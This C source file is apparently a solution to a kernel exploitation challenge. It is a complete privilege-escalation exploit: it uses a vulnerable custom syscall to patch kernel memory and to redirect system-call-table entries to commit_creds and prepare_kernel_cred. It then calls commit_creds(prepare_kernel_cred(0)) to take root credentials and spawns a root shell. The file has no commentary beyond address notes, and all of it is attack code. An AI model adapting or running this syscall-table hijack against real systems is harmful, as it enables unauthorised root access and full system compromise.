#include <stdio.h>

#define SYS_CALL_TABLE      0x8000e348      // manually configure this address!!
#define SYS_UPPER           223

unsigned int** sct;


int main(void){
    sct=(unsigned int**)SYS_CALL_TABLE;
    syscall(SYS_UPPER, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", 0x8003f560);
    syscall(SYS_UPPER, "\x60\xf5\x03\x80", &sct[25]); //commit_creds 0x8003f56c
    syscall(SYS_UPPER, "\x24\xf9\x03\x80", &sct[13]); //prepare_kernel_cred 0x8003f924

    //commit_creds(prepare_kernel_cred(0));
    syscall(25,syscall(13,0));
    system("/bin/sh");
    return 0;
}